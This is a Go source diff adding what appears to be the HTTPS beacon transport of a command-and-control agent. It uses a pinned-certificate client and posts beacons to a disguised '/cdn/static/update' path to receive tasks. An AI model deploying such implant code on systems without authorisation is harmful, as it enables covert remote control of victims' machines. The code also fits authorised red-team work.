@@ -1,0 +1,94 @@
+package agent
+
+import (
+	"bytes"
+	"context"
+	"crypto/sha256"
+	"crypto/subtle"
+	"crypto/tls"
+	"errors"
+	"fmt"
+	"io"
+	"net"
+	"net/http"
+	"time"
+
+	"github.com/perhapslater/sable/internal/protocol"
+)
+
+const (
+	beaconPath                 = "/cdn/static/update"
+	maxHTTPSTaskResponseBytes  = protocol.MaxHTTPSTaskResponseBytes
+	httpsBeaconResponseTimeout = 2 * time.Minute
+)
+
+// newPinnedClient returns an HTTP client that verifies the server's TLS
+// certificate matches the expected SHA-256 fingerprint.
+// InsecureSkipVerify is intentional. Manual fingerprint verification replaces CA chain validation.
+func newPinnedClient(expectedFP []byte) *http.Client {
+	transport := &http.Transport{
+		MaxIdleConns:          4,
+		MaxIdleConnsPerHost:   2,
+		IdleConnTimeout:       30 * time.Second,
+		TLSHandshakeTimeout:   10 * time.Second,
+		ResponseHeaderTimeout: 10 * time.Second,
+		ForceAttemptHTTP2:     true,
+		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
+			dialer := &tls.Dialer{
+				NetDialer: &net.Dialer{Timeout: 10 * time.Second},
+				Config: &tls.Config{
+					MinVersion:         tls.VersionTLS13,
+					InsecureSkipVerify: true, //nolint:gosec // replaced by manual fingerprint check below
+				},
+			}
+			conn, err := dialer.DialContext(ctx, network, addr)
+			if err != nil {
+				return nil, err
+			}
+			tlsConn, ok := conn.(*tls.Conn)
+			if !ok {
+				conn.Close()
+				return nil, errors.New("TLS dial did not return a TLS connection")
+			}
+			certs := tlsConn.ConnectionState().PeerCertificates
+			if len(certs) == 0 {
+				conn.Close()
+				return nil, errors.New("no TLS certificates presented by server")
+			}
+			fp := sha256.Sum256(certs[0].Raw)
+			if subtle.ConstantTimeCompare(fp[:], expectedFP) != 1 {
+				conn.Close()
+				return nil, fmt.Errorf("TLS certificate fingerprint mismatch: MITM detected")
+			}
+			return conn, nil
+		},
+	}
+	return &http.Client{
+		Transport: transport,
+		Timeout:   httpsBeaconResponseTimeout,
+	}
+}
+
+// sendBeaconHTTPS posts an encoded beacon and returns the raw response body.
+func sendBeaconHTTPS(client *http.Client, serverURL string, payload []byte) ([]byte, error) {
+	resp, err := client.Post(
+		serverURL+beaconPath,
+		"application/octet-stream",
+		bytes.NewReader(payload),
+	)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("server returned %d", resp.StatusCode)
+	}
+	data, err := io.ReadAll(io.LimitReader(resp.Body, maxHTTPSTaskResponseBytes+1))
+	if err != nil {
+		return nil, err
+	}
+	if len(data) > maxHTTPSTaskResponseBytes {
+		return nil, fmt.Errorf("server response exceeded %d bytes", maxHTTPSTaskResponseBytes)
+	}
+	return data, nil
+}
